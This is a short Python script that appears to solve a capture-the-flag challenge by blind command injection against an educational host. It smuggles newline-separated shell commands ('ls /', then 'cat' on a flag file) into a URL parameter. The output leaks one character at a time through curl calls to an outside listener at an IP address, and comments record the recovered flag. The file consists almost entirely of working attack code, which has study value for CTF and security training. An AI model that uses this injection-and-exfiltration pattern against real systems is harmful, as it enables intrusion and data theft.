import requests
# url = 'http://localhost'
url = 'http://edu.kaibro.tw:7777'
'''
ls /
'''
for i in range(100):
	h = "\nA=$(ls\t/)\ncurl\t140.112.30.39:12005?h=${A:"+str(i)+"}"
	get_url = '{}?h={}'.format(url,h)
	print(get_url)
	content = requests.get(get_url).content.decode()
	
# flag_s35uisf78h23nndiuf

for i in range(100):
	h = "\nA=$(cat\t/flag_s35uisf78h23nndiuf)\ncurl\t140.112.30.39:12005?h=${A:"+str(i)+"}"
	get_url = '{}?h={}'.format(url,h)
	print(get_url)
	content = requests.get(get_url).content.decode()

# FLAGez_blind_cmd_inj	
# FLAG{ez_blind_cmd_inj}
